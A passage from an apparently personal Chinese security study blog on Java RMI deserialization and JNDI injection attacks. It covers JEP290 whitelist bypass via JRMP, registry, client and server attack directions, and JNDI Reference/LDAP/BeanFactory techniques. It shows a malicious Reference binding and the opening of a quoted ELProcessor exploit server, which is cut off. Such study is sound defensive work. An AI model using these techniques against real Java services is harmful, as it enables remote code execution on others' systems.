        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> <span class="token operator">|</span> AlreadyBoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>HelloImpl.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>server<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>HelloInterface<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 实现接口</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">HelloInterface</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token function">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"sayHello"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>HelloInterface.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 客户端只需要接口，远程调用服务端的实现，接口必须在同一个package下</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">HelloInterface</span> <span class="token keyword">extends</span> <span class="token class-name">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里有一个小坑，就是Client和Server的Interface的完全限定名需要一直，之前在server下写了一个HelloInterface又在client下写了个一样的，但是分别在不同包下就没法类型转换过去，调用不了，最后就直接把实现留一个留在com.z33这个package下了</p>
<p>慢慢把各种攻击方式都本地搭个最简单的复现吧。。。</p>
<h3 id="攻击registry"><a href="#攻击registry" class="headerlink" title="攻击registry"></a>攻击registry</h3><p>对注册中心的攻击方式</p>
<h4 id="bind-amp-rebind"><a href="#bind-amp-rebind" class="headerlink" title="bind &amp; rebind"></a>bind &amp; rebind</h4><p>对注册中心调用bind和rebind的时候，是会对输入的对象进行反序列化的，因此直接在bind和rebind时发送一个恶意对象即可。不过在<code>jdk6u141</code>，<code>jdk7u131</code>，<code>jdk8u121</code>中加入了JEP290限制，进行了过滤，只允许白名单内的类反序列化，白名单如下所示，常见的利用链均不会在白名单之中，需要另辟蹊径。<strong>该白名单仅影响Registry的几个方法，因此客户端与服务端之间互相攻击仍然不受影响</strong><br>又，在jdk8u141及其之后对bind和rebind请求进行了检查，只允许本地发起的bind请求，即便使用之后提到的绕过白名单的打法进行攻击也会因为不是本地请求而失败，因此bind打法基本不适用，需要jdk版本较为古老</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> clazz
        <span class="token operator">||</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>activation<span class="token punctuation">.</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> ObjectInputFilter<span class="token punctuation">.</span>Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> ObjectInputFilter<span class="token punctuation">.</span>Status<span class="token punctuation">.</span>REJECTED<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h4><p>lookup因为是查registry，所以不会有刚才提到的限制，但lookup默认传递的是字符串，因为是查询名字对应的方法，传递的不是对象，但server对传递过来的对象即使是string类型也得反序列化，因此魔改lookup函数或是简单的复现其流程，发送一个object，或是通过java agent，rasp等方法注入程序替换序列化数据即可通过lookup攻击registry。</p>
<blockquote>
<p>rmb神仙和我说RMI的通信过程和HTTP差不多，都是发一个应答一个，交互基本上就一次性的，所以也可以手搓流量（大概）进行攻击，但是有一些objid之类的东西是随机的？所以需要额外的操作</p>
</blockquote>
<h4 id="jdk8u121之前"><a href="#jdk8u121之前" class="headerlink" title="jdk8u121之前"></a>jdk8u121之前</h4><p>lookup也好，bind rebind也好，都可以直接发一个能用的链直接一键打穿，这是最快乐的年代</p>
<h4 id="jdk8u121-8u232-b09"><a href="#jdk8u121-8u232-b09" class="headerlink" title="jdk8u121~8u232_b09"></a>jdk8u121~8u232_b09</h4><p>由于上文提到的类过滤，直接反序列化链的payload会因为不在白名单类中而失效，这时就需要想办法从白名单类中绕出来<br>这里使用的是允许的类中的Remote类和UnicastRef类<br>代码太高深，暂时还不是很懂，具体过程是通过控制UnicastRef对象中的LiveRef的属性，发起任意RMI连接，从而连接到恶意的server上，而RMI中传递的对象需要实现Remote接口，因此还需要用Remote类下的RemoteObjectInvocationHandler，调用其父类RemoteObject的readObject函数，而其中又调用了其ref属性的readExternal方法，这里的ref属性就是我们之前控制的UnicastRef类，抄一个函数介绍</p>
<blockquote>
<p>Java默认的序列化机制非常简单，而且序列化后的对象不需要再次调用构造器重新生成，但是在实际中，我们可以会希望对象的某一部分不需要被序列化，或者说一个对象被还原之后，其内部的某些子对象需要重新创建，从而不必将该子对象序列化。 在这些情况下，我们可以考虑实现Externalizable接口从而代替Serializable接口来对序列化过程进行控制。<br>Externalizable接口extends Serializable接口，而且在其基础上增加了两个方法：writeExternal()和readExternal()。这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊的操作。</p>
</blockquote>
<p>在这里readExternal就用ref的ip port一路发起tcp连接并调用一个lookup函数，从而连接到传说中的JRMPListener</p>
<h5 id="JRMP-Listener-amp-amp-JRMP-Client"><a href="#JRMP-Listener-amp-amp-JRMP-Client" class="headerlink" title="JRMP Listener &amp;&amp; JRMP Client"></a>JRMP Listener &amp;&amp; JRMP Client</h5><p>yso中JRMP不仅分为Listener和Client，还分为payload和exploit，排列组合就等于有四个类型。两两一组形成两种利用模式<br>payload&#x2F;listener+expolit&#x2F;client和payload&#x2F;client+expolit&#x2F;listener</p>
<p>前者通过发送一个反序列化链，使得目标机器启动一个RMI服务监听，然后利用JRMP client发送一个链进行利用</p>
<p>后者通过发送一个反序列化链，使得目标机器反过来对攻击者的JRMP listener发起RMI连接，并通过listener返回一个恶意的链进行攻击</p>
<p>上文提到的白名单绕过，就是使用JRMP Client绕过白名单，让目标对攻击者服务器发送RMI连接（调用lookup函数），此时绕过了对JEP290反序列化类的限制，再从无限制的RMI方法调用中返回真正的payload打穿。<br>JRMP Listener在RMI连接可控时，能稳定打一个反序列化，其可以通过返回一个ExceptionalReturn状态，在Client处理该状态时，会直接对返回的数据进行反序列化，从而打通。<br>这个方案不仅适用于lookup函数，在client进行远程方法调用等场合，无论返回值为何种类型，均可以返回该异常类型进行反序列化</p>
<h3 id="registry攻击client"><a href="#registry攻击client" class="headerlink" title="registry攻击client"></a>registry攻击client</h3><p>同样也能打服务端，但是基本上注册中心和服务端都是一台机子，所以就不多说了。<br>其实从上面也能看出来，只要两个机器远程交互的时候传递了序列化的对象，那接受的机器基本上就没跑的会把序列化的对象给反序列化出来，只要目标机器上确实存在这个链，就能一键打通。<br>使用ysoserial可以生成一个恶意的注册中心，只要服务端调用注册中心的方法，就给你返回一个执行命令的Object给你反序列化</p>
<h3 id="client攻击server"><a href="#client攻击server" class="headerlink" title="client攻击server"></a>client攻击server</h3><p>服务端对传递过来的参数放进了一个<code>unmarshalValue</code>函数进行处理，该方法在参数不是基本类型的情况下会对传入数据进行readObject，所以客户端提交给服务端的数据里得有一个Object，也就是服务端提供的函数调用中，至少得有一个函数接受的参数是一个Object，<strong>至少得不是一个primitive type才能触发readObject</strong>，才能发一个恶意对象过去进行利用<br>如图<br><img src="/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/unmarshalValue.png" alt="unmarshalValue.png"><br>这里可以看到服务端对传过来的类进行了一个类型判断，只要不是primitive type的类就直接进行readObject反序列化，而再来看一下primitive type有哪些<br><img src="/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/isPrimitive.png" alt="isPrimitive.png"><br>这意味着string也不是基础类型，服务端如果接受的是string也能打通</p>
<p>把这个复现一下</p>
<h4 id="魔改代码"><a href="#魔改代码" class="headerlink" title="魔改代码"></a>魔改代码</h4><p>因为需要调用可序列化对象为参数的函数，所以得把之前的代码加点东西，魔改一下<br>简单起见，给Hello的接口和实现里面加一个接收Object的函数。</p>
<p><em>即使我们上面说到String类型也能被反序列化，但本地代码调用远程方法的时候肯定还是得按远程方法的参数类型去发送，否则会出现方法hash校验不通过，即使接受String类型参数的远程方法会反序列化我们发过去的参数，但本地仍然无法轻松的违背调用规则发送一个非String的序列化数据，这就需要对Java源码进行一些魔改或者通过debug和注入程序的方式进行魔改。</em></p>
<p><em>jdk8u242中修改了readObject0方法，专门对String类型做了校验，还整出来了有关readString方法专门去读String，简单的理解就是不能再远程接受参数为String的时候硬传个其他的类型上去了。但是除了String外的非基础类型千千万，这么个过滤真的有用吗？</em></p>
<p>这里演示的是直接传Object的简单利用</p>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// HelloInterface</span>
<span class="token keyword">public</span> String <span class="token function">sayHelloObj</span><span class="token punctuation">(</span>Object name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// HelloImpl</span>
<span class="token keyword">public</span> String <span class="token function">sayHelloObj</span><span class="token punctuation">(</span>Object name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>
    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token string">"sayHelloObj"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>然后打一个喜闻乐见的cc反序列化<br>然后cc链的依赖引不进来，又折腾了半天，就是不行，最后把项目重新用maven开了一遍。。。用maven引进来了，然后发现IDEA不知道为什么开始占用一堆端口，把1000-1200中间的几十个端口给占了，然后再改了一下Registry的端口，Client里面调用一下<br>嗯，没打通，用的CC1的链太古老了，打不通我最新版本jdk8，然后换上cc567几个链可以打高版本，成功弹出计算器。</p>
<p>这里踩了一个小坑，我一开始是直接从rmb神仙的博客里复制粘贴了一个cc5的链，他那里填的命令执行的内容是touch一个文件，而我本地windows肯定不会有touch这个命令，也就出现了报错，但我却发现报错是在client端出现的，而server貌似平稳运行，啥也没说。</p>
<p>经过各种下断点调试，最后我发现，命令执行确实是在server上执行的，只不过报错也好结果也好都会返回给client，我差点以为是哪里出错了导致实际上命令是在client端执行的，呼应了之前的JRMP Listener无论方法client调用的方法的返回值是什么类型，反正直接返回一个异常类型反序列化打通</p>
<p>也学会了一些调试的方法，比如什么在方法处下断点，跟着报错的调用栈几十层几十层的进之类的。。。</p>
<h3 id="server攻击client"><a href="#server攻击client" class="headerlink" title="server攻击client"></a>server攻击client</h3><p>刚才说了，只要信息交换过程中给了序列化数据十有八九就会反序列化，所以当客户端调用服务端方法的时候，同样可以让服务端返回一个Object，只需要让客户端调用一个返回值是Object的方法，返回一个恶意的Object就可以把客户端打穿，因此在你攻击其他人的时候，也有可能反手被其他人攻击</p>
<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JNDI注入的关键是在用户进行远程方法调用时返回的stub是一个reference类型的对象，且用户本地CLASSPATH不存在该类字节码，导致用户需要加载reference类的字节码，直接返回恶意类字节码命令执行</p>
<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p><del>没什么用的名词介绍环节</del><br>Java Naming and Directory Interface，Java命名和目录接口，通过调用JNDI的API应用程序可以定位资源和其他程序对象，现在JNDI能访问的服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA。</p>
<p>其提供如下三种服务：<br>Naming Service 命名服务：<br>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</p>
<p>Directory Service 目录服务：<br>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
<p>Reference 引用：<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
<h3 id="RMI绑定远程对象"><a href="#RMI绑定远程对象" class="headerlink" title="RMI绑定远程对象"></a>RMI绑定远程对象</h3><p>通过在注册中心上绑定一个恶意reference类对象，将恶意对象的字节码放在HTTP&#x2F;FTP&#x2F;SMB服务器上，需要客户端在加载reference类时在本地无法找到，通过codebase远程加载恶意类，在类实例化时触发payload<br>需要满足如下利用条件</p>
<ul>
<li>安装并配置了SecurityManager</li>
<li>java.rmi.server.useCodebaseOnly&#x3D;false，当useCodebasOnly为true时只允许加载信任codebase，不对未知codebase动态加载类，Java从7u21、6u45开始默认该属性为true<br>泛用性很低</li>
</ul>
<h3 id="JNDI-Reference"><a href="#JNDI-Reference" class="headerlink" title="JNDI Reference"></a>JNDI Reference</h3><p>RMI服务端在进行bind操作的时候，可以绑定一个JNDI Naming Reference（感觉类似于之前的RMI绑定远程对象），当客户端申请Stub的时候，返回的就是一个引用（Reference）对象，该引用对象的加载与RMI Class Loading的机制不同，因此可以绕过<code>java.rmi.server.useCodebaseOnly</code>的限制，但同样有相应的利用条件，需<code>com.sun.jndi.rmi.object.trustURLCodebase=true&amp;com.sun.jndi.cosnaming.object.trustURLCodebase=true</code>，其设置为false时限制了从远程Codebase加载Reference工厂类，JDK 6u132, JDK 7u122, JDK 8u113开始将其默认设置为false</p>
<p>Reference对象没有实现Remote接口也不继承UnicastRemoteObject类，就不能绑定到注册中心上，需要用<code>ReferenceWrapper</code>这个包装类对其进行包装</p>
<pre class=" language-java"><code class="language-java">Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"http://localhost/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ReferenceWrapper wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>当客户端在lookup之类操作问注册中心要Stub的时候，拿到的是引用对象，经过如下调用栈（复制粘贴先知的）</p>
<pre><code>getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:411, InitialContext (javax.naming)
main:7, JNDI_Test (demo)
</code></pre>
<p>在<code>getObjectFactoryFromReference</code>最后是这么一段</p>
<pre class=" language-java"><code class="language-java">String codebase<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span>
            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span>
</code></pre>
<p>从codebase加载远程类字节码，最后返回一个clas.newInstance，这里就触发了我们预先在恶意类中埋下的雷，实现命令执行</p>
<h3 id="JNDI-Reference-LDAP"><a href="#JNDI-Reference-LDAP" class="headerlink" title="JNDI Reference+LDAP"></a>JNDI Reference+LDAP</h3><p>绑定的东西改成一个LDAP服务，LDAP服务同样可以返回一个JNDI Reference对象，这时通过LDAP远程加载，不受上面这两个<code>com.sun.jndi.rmi.object.trustURLCodebase&amp;com.sun.jndi.cosnaming.object.trustURLCodebase</code>属性的控制，同样也被打了补丁<br>在在Oracle JDK 11.0.1、8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被调整为false</p>
<h3 id="利用本地链进行执行"><a href="#利用本地链进行执行" class="headerlink" title="利用本地链进行执行"></a>利用本地链进行执行</h3><p>同样有两种攻击方式，一种是利用本地Class作为Reference Factory，第二种是利用本地存在的反序列化链直接进行RCE</p>
<h4 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h4><p>本地class作为Reference Factory，这里使用的是<code>org.apache.naming.factory.BeanFactory</code><br>利用条件为</p>
<blockquote>
<p>implement “javax.naming.spi.ObjectFactory” and have at least a “getObjectInstance” method</p>
</blockquote>
<p>这个BeanFactory可以创建任意bean的实例并调用其setter方法（但是我还没有很理解bean是一个什么概念。。。），也许就是实例化任意类？说起来setter调用就会想起来fastJson，但是fastjson的常见利用链，好像就一个JDNI注入是用setter的，剩下的都是用getter，而这里本身就是通过JDNI注入才走到这步的，好像gadget并不互通。。。</p>
<p>构造的bean需要满足如下条件</p>
<blockquote>
<p>The target class should have a public no-argument constructor and public setters with only one “String” parameter. In fact, these setters may not necessarily start from ‘set..’ as “BeanFactory” contains some logic surrounding how we can specify an arbitrary setter name for any parameter.</p>
</blockquote>
<p>这个BeanFactory有一个奇怪的表现，他会读取ref对象中的<code>forceString</code>属性，如果这个属性的值为<code>a=b</code>，那么BeanFactory就会把函数b当做a属性的setter</p>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/* Look for properties with explicitly configured setter */</span>
RefAddr ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Map forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
String value<span class="token punctuation">;</span>
 
<span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Class <span class="token class-name">paramTypes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
    String setterName<span class="token punctuation">;</span>
    <span class="token keyword">int</span> index<span class="token punctuation">;</span>
 
    <span class="token comment" spellcheck="true">/* Items are given as comma separated list */</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>String param<span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">/* A single item can either be of the form name=method
         * or just a property name (and we will use a standard
         * setter) */</span>
        index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            setterName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            setterName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span>
                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span>
                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<p>也就是说，我们可以使用BeanFactory调用任意一个拥有public无参构造方法类的以一个String为参数的方法</p>
<p>这里使用的是<code>javax.el.ELProcessor</code>这个类，这个类（好像还蛮经典的）可以使用eval方法执行java代码，且均符合上述条件</p>
<p>原作者给出的poc如下</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ResourceRef<span class="token punctuation">;</span>
 
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilRMIServerNew</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1097"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1097</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token comment" spellcheck="true">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>
        ResourceRef ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span>
        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span>
